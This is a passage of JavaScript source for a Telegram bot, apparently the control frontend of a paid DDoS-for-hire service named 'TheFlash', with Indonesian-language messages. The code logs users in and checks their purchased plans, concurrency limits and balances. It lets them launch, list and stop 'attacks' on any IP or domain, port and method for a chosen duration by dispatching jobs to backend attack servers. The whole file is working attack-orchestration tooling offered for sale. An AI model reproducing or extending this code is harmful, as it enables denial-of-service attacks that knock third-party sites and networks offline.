    const { text, kb } = await renderMenu(tgId);
    return editMsg(chatId, msgId, text, { reply_markup: kb });
  }

  // ── Login ──
  if (data === 'cmd_login') {
    await deleteMsg(chatId, msgId).catch(() => {});
    return startLoginWizard(chatId, tgId);
  }

  // ── Attack ──
  if (data === 'cmd_attack') {
    await deleteMsg(chatId, msgId).catch(() => {});
    return startAttackWizard(chatId, tgId);
  }

  // ── Select method from methods page (quick attack) ──
  if (data.startsWith('sel_method_')) {
    const method = data.replace('sel_method_', '');
    pendingInput.set(tgId, { step: 'atk_target', data: { preMethod: method } });
    await deleteMsg(chatId, msgId).catch(() => {});
    return sendMsg(chatId,
`╔══════════════════════════════╗
   ⚔️  <b>QUICK ATTACK</b>
╚══════════════════════════════╝

Method: <code>${method}</code>

<b>[ Step 1/4 ]</b>  🎯 <b>Target</b>

Masukkan IP atau domain target:`,
      { reply_markup: { force_reply: true, selective: true } }
    );
  }

  // ── Methods page ──
  if (data.startsWith('method_page_')) {
    const page = Number(data.replace('method_page_', '')) || 0;
    const { text, kb } = await renderMethods(tgId, page);
    return editMsg(chatId, msgId, text, { reply_markup: kb });
  }

  // ── Ongoing ──
  if (data === 'cmd_ongoing') {
    const { text, kb } = await renderOngoing(tgId);
    return editMsg(chatId, msgId, text, { reply_markup: kb });
  }

  // ── Stop single ──
  if (data.startsWith('stop_')) {
    const jobId = data.replace('stop_', '');
    const s = sessions.get(tgId);
    const res = await stopJob(s.userId, jobId);
    if (!res.ok) {
      return editMsg(chatId, msgId, `❌ ${res.err}`, { reply_markup: KB.back('cmd_ongoing') });
    }
    const { text: onText, kb: onKb } = await renderOngoing(tgId);
    return editMsg(chatId, msgId,
`✅ <b>Attack dihentikan!</b>

🎯 <code>${res.row.target}:${res.row.port || 0}</code>
⚔️ <code>${res.row.method}</code>

──────────────────────────────
${onText}`,
      { reply_markup: onKb }
    );
  }

  // ── Stop all ──
  if (data === 'cmd_stopall') {
    const s = sessions.get(tgId);
    const rows = await all(`SELECT job_id,method,target,port,duration_seconds,servers FROM ongoing_runs WHERE user_id=?`, [s.userId]);
    if (!rows.length) {
      const { text, kb } = await renderMenu(tgId);
      return editMsg(chatId, msgId, '📭 Tidak ada attack aktif.\n\n' + text, { reply_markup: kb });
    }
    const srvRows = await all(`SELECT id, api_url FROM servers WHERE status='Online'`);
    for (const row of rows) {
      let srvIds = []; try { srvIds = JSON.parse(row.servers || '[]'); } catch (_) {}
      const stopSrvs = srvRows.filter((s) => srvIds.includes(s.id) && s.api_url);
      for (const srv of stopSrvs) {
        const url = buildUrl(srv.api_url, { target: row.target, port: row.port, sec: Number(row.duration_seconds) || 0, label: 'STOP' });
        if (url) httpGet(url).catch(() => {});
      }
    }
    const ids = rows.map((r) => r.job_id);
    const ph = ids.map(() => '?').join(',');
    await run(`DELETE FROM ongoing_runs WHERE job_id IN (${ph})`, ids);
    const { text, kb } = await renderMenu(tgId);
    return editMsg(chatId, msgId, `✅ <b>${ids.length} attack dihentikan!</b>\n\n${text}`, { reply_markup: kb });
  }

  // ── Plan ──
  if (data === 'cmd_plan') {
    const s = sessions.get(tgId);
    const limits = await resolvePlan(s.userId);
    if (!limits.planId) {
      return editMsg(chatId, msgId,
`╔══════════════════════════════╗
   💳  <b>PLAN INFO</b>
╚══════════════════════════════╝

❌ Kamu belum punya plan aktif.

Beli plan di website TheFlash.`,
        { reply_markup: KB.back() }
      );
    }
    const p = limits.plan;
    const active = await getActiveConc(s.userId);
    const bar = progressBar(active, p.conc);
    return editMsg(chatId, msgId,
`╔══════════════════════════════╗
   💳  <b>PLAN INFO</b>
╚══════════════════════════════╝

📦  Plan       :  <b>${p.name}</b>
🛡  Akses      :  ${p.access}
⏱  Durasi Max  :  <b>${fmtTime(p.time)}</b>
⚡  Concurrent  :  <b>${p.conc}</b>
❄️  Cooldown    :  <b>${p.cooldown ? fmtTime(p.cooldown) : 'Tidak ada'}</b>
🔌  API Access  :  ${p.apiAccess ? '✅ Ya' : '❌ Tidak'}
📅  Expired     :  ${p.expired > 0 ? `${p.expired} hari` : 'Tidak ada'}

⚡ <b>Usage</b>
<code>${bar}</code>  ${active}/${p.conc}`,
      { reply_markup: KB.back() }
    );
  }

  // ── Balance ──
  if (data === 'cmd_balance') {
    const s = sessions.get(tgId);
    const u = await get('SELECT balance FROM users WHERE id=?', [s.userId]);
    const bal = fmtCurrency(u?.balance || 0);
    return editMsg(chatId, msgId,
`╔══════════════════════════════╗
   💰  <b>BALANCE</b>
╚══════════════════════════════╝

💳 Saldo kamu saat ini:

<b>${bal}</b>`,
      { reply_markup: KB.back() }
    );
  }

  // ── Whoami ──
  if (data === 'cmd_whoami') {
    const text = await renderProfile(tgId);
    return editMsg(chatId, msgId, text, { reply_markup: KB.back() });
  }

  // ── Methods ──
  if (data === 'cmd_methods') {
    const { text, kb } = await renderMethods(tgId, 0);
    return editMsg(chatId, msgId, text, { reply_markup: kb });
  }

  // ── Logout ──
  if (data === 'cmd_logout') {
    const s = sessions.get(tgId);
    sessions.delete(tgId);
    pendingInput.delete(tgId);
    return editMsg(chatId, msgId,
`╔══════════════════════════════╗
   👋  <b>LOGOUT</b>
╚══════════════════════════════╝

Sampai jumpa, <b>${s?.username || 'User'}</b>!

Ketik /start untuk login kembali.`,
      { reply_markup: { inline_keyboard: [[{ text: '🔐 Login Kembali', callback_data: 'cmd_login' }]] } }
    );
  }
};

// ───────────────────────────────────────────────────────────────────────────────
//  MESSAGE HANDLER
// ───────────────────────────────────────────────────────────────────────────────

const handleMessage = async (msg) => {
  const chatId   = msg.chat?.id;
  const tgId     = msg.from?.id;
  const firstName = msg.from?.first_name || 'User';
  const rawText  = (msg.text || '').trim();
  if (!rawText || !chatId || !tgId) return;

  const isCmd = rawText.startsWith('/');
  const parts = rawText.split(/\s+/);
  const cmd   = isCmd ? parts[0].split('@')[0].toLowerCase() : null;
  const args  = parts.slice(1);

  try {
    // Wizard input
    if (!isCmd && pendingInput.has(tgId)) {
      if (await handleWizard(chatId, tgId, rawText)) return;
    }
    if (!isCmd) return;

    switch (cmd) {
      case '/start':  return cmdStart(chatId, tgId, firstName);
      case '/menu':   return cmdMenu(chatId, tgId);
      case '/login':  return startLoginWizard(chatId, tgId);
      case '/logout': {
        if (!sessions.has(tgId)) return sendMsg(chatId, '❌ Belum login.');
        const s = sessions.get(tgId);
        sessions.delete(tgId); pendingInput.delete(tgId);
        return sendMsg(chatId, `👋 Berhasil logout dari akun <b>${s.username}</b>.`);
      }
      case '/attack': {
        if (args.length >= 4) {
          // Quick: /attack target port method dur [eng]
          if (!sessions.has(tgId)) return sendMsg(chatId, '❌ Login dulu. /start');
          if (!(await isMember(tgId))) return sendMsg(chatId, '🚫 Join grup dulu untuk attack.');
          const [rawTarget, rawPort, rawMethod, rawDur, rawEng] = args;
          const target = cleanTarget(rawTarget);
          if (!target) return sendMsg(chatId, '❌ Target tidak valid.');
          const port = parseInt(rawPort, 10) || 0;
          const durInput = cleanDuration(rawDur);
          if (!durInput) return sendMsg(chatId, '❌ Durasi tidak valid. Contoh: 60s, 5m');
          const eng = Math.max(1, parseInt(rawEng, 10) || 1);
          const s = sessions.get(tgId);
          const sent = await tg('sendMessage', {
            chat_id: chatId, parse_mode: 'HTML',
            text: `⏳ <b>Launching...</b>\n\n🎯 <code>${target}:${port}</code>\n⚔️ <code>${rawMethod}</code>\n⏱ ${durInput}  ⚡ ${eng}`,
          });
          const res = await doAttack({ userId: s.userId, target, port, durInput, methodInput: sanitize(rawMethod).toLowerCase(), eng });
          if (!res.ok) return editMsg(chatId, sent?.result?.message_id, `❌ <b>Gagal</b>\n\n${res.err}`, { reply_markup: KB.back('cmd_menu') });
          return editMsg(chatId, sent?.result?.message_id,
`╔══════════════════════════════╗
   ✅  <b>ATTACK LAUNCHED!</b>
╚══════════════════════════════╝

🎯 <code>${res.target}:${res.port || 0}</code>
⚔️ <code>${res.display || res.method}</code>
⏱ <b>${fmtTime(res.durSec)}</b>  ⚡ <b>${res.eng}</b>

🆔 <code>${res.jobId}</code>`,
            { reply_markup: KB.stopAttack(res.jobId) }
          );
        }
        return startAttackWizard(chatId, tgId);
      }
      case '/ongoing': {
        if (!sessions.has(tgId)) return sendMsg(chatId, '❌ Login dulu. /start');
        const { text, kb } = await renderOngoing(tgId);
        return sendMsg(chatId, text, { reply_markup: kb });
      }
      case '/stop': {
        if (!sessions.has(tgId)) return sendMsg(chatId, '❌ Login dulu. /start');
        if (!args[0]) return sendMsg(chatId, '❌ Sertakan Job ID.\n\nContoh: /stop <code>abc123...</code>');
        const s = sessions.get(tgId);
        const res = await stopJob(s.userId, sanitize(args[0]).trim());
        if (!res.ok) return sendMsg(chatId, res.err);
        return sendMsg(chatId,
`╔══════════════════════════════╗
   ✅  <b>ATTACK DIHENTIKAN</b>
╚══════════════════════════════╝

🎯 <code>${res.row.target}:${res.row.port || 0}</code>
⚔️ <code>${res.row.method}</code>`);
      }
      case '/stopall': {
        if (!sessions.has(tgId)) return sendMsg(chatId, '❌ Login dulu. /start');
        const s = sessions.get(tgId);
        const rows = await all(`SELECT job_id,target,port,duration_seconds,servers FROM ongoing_runs WHERE user_id=?`, [s.userId]);
        if (!rows.length) return sendMsg(chatId, '📭 Tidak ada attack aktif.');
        const srvRows = await all(`SELECT id, api_url FROM servers WHERE status='Online'`);
        for (const row of rows) {
          let srvIds = []; try { srvIds = JSON.parse(row.servers || '[]'); } catch (_) {}
          for (const srv of srvRows.filter((x) => srvIds.includes(x.id) && x.api_url)) {
            const url = buildUrl(srv.api_url, { target: row.target, port: row.port, sec: Number(row.duration_seconds) || 0, label: 'STOP' });
            if (url) httpGet(url).catch(() => {});
          }
        }
        const ids = rows.map((r) => r.job_id);
        const ph = ids.map(() => '?').join(',');
        await run(`DELETE FROM ongoing_runs WHERE job_id IN (${ph})`, ids);
        return sendMsg(chatId, `✅ <b>${ids.length} attack dihentikan!</b>`);
      }
      case '/methods': {
        if (!sessions.has(tgId)) return sendMsg(chatId, '❌ Login dulu. /start');
        const { text, kb } = await renderMethods(tgId, 0);
        return sendMsg(chatId, text, { reply_markup: kb });
      }
      case '/plan': {
        if (!sessions.has(tgId)) return sendMsg(chatId, '❌ Login dulu. /start');
        return tg('sendMessage', { chat_id: chatId, text: '💳', parse_mode: 'HTML' }).then(() =>
          handleCallback({ message: { chat: { id: chatId }, message_id: 0 }, from: { id: tgId }, data: 'cmd_plan', id: 'x' })
        );
      }
      case '/balance': {
        if (!sessions.has(tgId)) return sendMsg(chatId, '❌ Login dulu. /start');
        const s = sessions.get(tgId);
        const u = await get('SELECT balance FROM users WHERE id=?', [s.userId]);
        return sendMsg(chatId, `💰 <b>Balance:</b>  ${fmtCurrency(u?.balance || 0)}`);
      }
      case '/help':
        return sendMsg(chatId,
`╔══════════════════════════════╗
   📖  <b>HELP / COMMAND LIST</b>
╚══════════════════════════════╝

<b>🔐 Auth</b>
/start   — Menu utama & login
/login   — Login ke akun
/logout  — Logout
/menu    — Kembali ke menu

<b>⚔️ Attack</b>
/attack                      — Wizard
/attack &lt;target&gt; &lt;port&gt; &lt;method&gt; &lt;dur&gt; [eng]
/ongoing                     — Lihat aktif
/stop &lt;jobId&gt;               — Stop satu
/stopall                     — Stop semua

<b>📊 Info</b>
/methods  — Daftar method
/plan     — Info plan
/balance  — Cek saldo
/help     — Bantuan ini`);

      default:
        return sendMsg(chatId, '❓ Command tidak dikenal.\n\nKetik /help untuk daftar command.');
    }
  } catch (err) {
    console.error('[Bot] Error:', err.message);
    sendMsg(chatId, '❌ Terjadi kesalahan. Coba lagi nanti.').catch(() => {});
  }
};

// ───────────────────────────────────────────────────────────────────────────────
//  POLLING
// ───────────────────────────────────────────────────────────────────────────────

let lastId = 0;

const poll = async () => {
  try {
    const res = await tg('getUpdates', { offset: lastId + 1, timeout: 30, allowed_updates: ['message', 'callback_query'] });
    if (res.ok && Array.isArray(res.result)) {
      for (const u of res.result) {
        if (u.update_id > lastId) {
          lastId = u.update_id;
          if (u.callback_query) handleCallback(u.callback_query).catch((e) => console.error('[Bot] cb error:', e.message));
          else if (u.message)   handleMessage(u.message).catch((e) => console.error('[Bot] msg error:', e.message));
        }
      }
    }
  } catch (e) {
    if (!/timeout|ECONNRESET|ETIMEDOUT/i.test(e.message)) console.error('[Bot] poll error:', e.message);
    await sleep(3000);
  }
};

// ───────────────────────────────────────────────────────────────────────────────
//  BOOT
// ───────────────────────────────────────────────────────────────────────────────

console.log('[TheFlash Bot] 🔄  Initializing...');

initDb().then(async () => {
  console.log('[TheFlash Bot] ✅  Database ready');
  try { await tg('deleteWebhook', {}); } catch (_) {}
  const me = await tg('getMe', {});
  const name = me?.result?.username || 'TheFlashBot';
  console.log(`[TheFlash Bot] ✅  @${name} is online!`);
  console.log('[TheFlash Bot] 📡  Polling for updates...\n');
  (async () => { for (;;) await poll(); })();
}).catch((e) => {
  console.error('[TheFlash Bot] ❌  DB init failed:', e.message);
  process.exit(1);
});
